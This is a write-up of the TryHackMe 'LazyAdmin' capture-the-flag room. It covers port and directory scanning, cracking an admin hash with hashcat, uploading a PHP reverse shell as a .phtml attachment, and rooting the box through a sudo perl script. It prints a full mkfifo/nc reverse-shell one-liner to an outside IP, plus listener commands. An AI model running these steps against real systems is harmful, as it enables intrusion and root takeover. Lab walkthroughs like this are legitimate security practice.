# LazyAdmin

[LazyAdmin](https://tryhackme.com/room/lazyadmin)

## Solution

- nmap scan: 22, 80

- dirb scan: content, content/as, content/inc

In content/inc we find an interesting directory `content/inc/mysql_backup/`
that contains a sql dump. We can look after 'INSERT' statements and try to find
some useful information. For example we find
`"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\"`,
which looks like a username and a password. We can try to indentify the hash
with hashid. Then we can use hashcat to crack the password. `hashcat -m 0
'42f749ade7f9e195bf475f37a44cafcb' </path/to/rockyou.txt>`

With the new found username and password we can login into `content/as` and
access the dashboard.

We can create a post and upload php code to the attachment, hopefully it will
get executed. To bypass any filters use the `phtml` extension (usually works).
In the payload add a reverse shell script using php. Then create a post and add
the script as an attachment. Next you can visit `/content/attachment` and click
on the script to execute it. You will also need an nc listener to connect.

Inside the home of the itguy we can find the flag and the password for the
mysql database `rice:randompass`. That was a rabbit hole I guess. I looked into
the users table but root did not have a password there.

The next thing to try is `sudo -l` and it looks like we can run perl without
needing a password. `(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl`

```
cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

```
cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

If we run the command as sudo, this will attempt to open a shell on that host
and port. So we can just modify the ip address to our ip address and run the
script, while on the host we use nc to listen on port 5554. Now we should be
logged in as root.

On host `nc -lvnp 5554` and on target `sudo /usr/bin/perl
/home/itguy/backup.pl`. Then we can `cd root` and `cat root.txt`.
